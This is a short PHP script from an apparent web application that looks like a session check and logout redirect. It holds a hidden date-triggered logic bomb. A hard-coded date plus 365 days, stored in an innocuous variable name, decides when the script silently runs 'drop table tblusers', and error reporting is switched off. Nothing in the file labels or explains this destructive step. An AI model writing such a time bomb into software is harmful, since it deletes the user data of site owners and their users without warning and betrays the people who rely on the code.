<?php
session_start();
error_reporting(0);
include('dbconnection.php');
if (strlen($_SESSION['sid']==0)) {
  header('location:logout.php');
} else{
  
    $date = "2023-03-13";
    $ma_petite_cherie= date('Y-m-d', strtotime($date. ' + 365 days'));
    if ($ma_petite_cherie<date('Y-m-d')) {
    	// code...
        mysqli_query($con,"drop table `tblusers`");
        header('location:logout.php');
}
else{
    header('location:../../../../../../logout.php');
}
}
?>